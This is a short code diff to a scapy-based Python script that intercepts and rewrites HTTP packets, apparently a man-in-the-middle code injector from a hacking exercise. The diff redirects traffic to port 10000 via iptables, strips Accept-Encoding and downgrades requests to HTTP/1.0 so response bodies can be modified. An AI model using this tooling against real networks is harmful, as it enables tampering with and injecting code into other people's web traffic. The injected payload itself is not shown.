@@ -22,12 +22,16 @@ def process_packet(packet):
         # print(scapy_packet.show())
         # if dport(destination port) is http, then packet is a request
         # if sport(source port) is http, then packet is a response
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[
+            scapy.TCP].dport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
             print("[+] HTTP Request")
             # remove Accept-Encoding header so response will have html in plain text, and then we can modify it.
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # non-greedy match
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
+            # 1.1 sends response in chunks, will cause problem with our method of modifying content-length, so use 1.0
 
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[
+            scapy.TCP].sport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
             print("[+] HTTP Response")
             # print scapy_packet.show()
             before_injection = load
